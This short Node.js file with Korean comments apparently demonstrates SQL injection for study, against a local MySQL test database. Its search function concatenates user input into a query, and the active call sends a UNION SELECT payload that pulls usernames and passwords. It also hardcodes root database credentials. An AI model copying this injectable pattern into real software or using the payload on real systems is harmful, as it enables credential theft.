import mysql from 'mysql2/promise';

const pool = mysql.createPool({
  host: 'localhost', user: 'root', password: '1234', database: 'mydb',
  port : 3307
});

const searchBoard = async (keyword) => {
  try {
    const query = `
      SELECT id, title, content, author
      FROM test_board
      WHERE title LIKE '%${keyword}%'
    `;

    console.log('실행 쿼리:', query);

    const [rows] = await pool.query(query);
    console.log(rows);
  } catch (e) {
    console.error('에러:', e.message);
  } finally {
    await pool.end();
  }
};

// 정상 검색
// await searchBoard("첫 번째");

// Injection 공격 (UNION 사용)
await searchBoard("' UNION SELECT id, username, password, 'user' FROM test_user -- ");
// await searchBoard("' UNION SELECT ename, hiredate,empno, sal FROM emp -- ");

// join은 컬럼으로 연결
//union은 row로 연결